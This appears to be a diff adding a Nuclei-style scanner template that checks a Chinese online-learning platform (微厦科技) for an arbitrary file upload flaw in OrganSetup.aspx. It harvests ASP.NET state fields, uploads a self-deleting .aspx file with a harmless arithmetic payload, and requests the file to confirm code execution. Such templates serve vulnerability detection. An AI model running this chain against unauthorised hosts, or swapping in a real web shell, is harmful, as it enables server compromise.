@@ -1,0 +1,84 @@
+id: weixia-onlinestudy-file-upload
+
+info:
+  name: 微厦科技-在线学习云服务平台 OrganSetup.aspx - File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 微厦科技-在线学习云服务平台
+
+variables:
+  rfilename: "{{rand_base(4, 'abcdefghijklmnopqrstuvwxyz')}}"
+  s1: "{{rand_int(40000, 44800)}}"
+  s2: "{{rand_int(40000, 44800)}}"
+  rboundary: "{{rand_base(8, 'abcdefghijklmnopqrstuvwxyz')}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Manage/Admin/OrganSetup.aspx"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "__EVENTVALIDATION"
+          - "__VIEWSTATE"
+    extractors:
+      - type: regex
+        name: viewstate
+        part: body
+        group: 1
+        regex:
+          - '__VIEWSTATE" value="(.+?)"'
+      - type: regex
+        name: eventvalidation
+        part: body
+        group: 1
+        regex:
+          - '__EVENTVALIDATION" value="(.+?)"'
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/Manage/Admin/OrganSetup.aspx"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+    body: |+
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="__VIEWSTATE"
+
+      {{viewstate}}
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
+
+      B81C8FAF
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="__EVENTVALIDATION"
+
+      {{eventvalidation}}
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="ctl00$cphMain$fuLoad"; filename="{{rfilename}}.aspx"
+      Content-Type: application/octet-stream
+
+      <%@Page Language="C#"%>
+      <%Response.Write({{s1}}*{{s2}});System.IO.File.Delete(Request.PhysicalPath);%>
+      ------WebKitFormBoundary{{rboundary}}--
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "操作成功"
+    extractors:
+      - type: regex
+        name: uploadfilename
+        part: body
+        group: 1
+        regex:
+          - '(\d+).aspx'
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/Upload/Org/{{uploadfilename}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{s1 * s2}}"
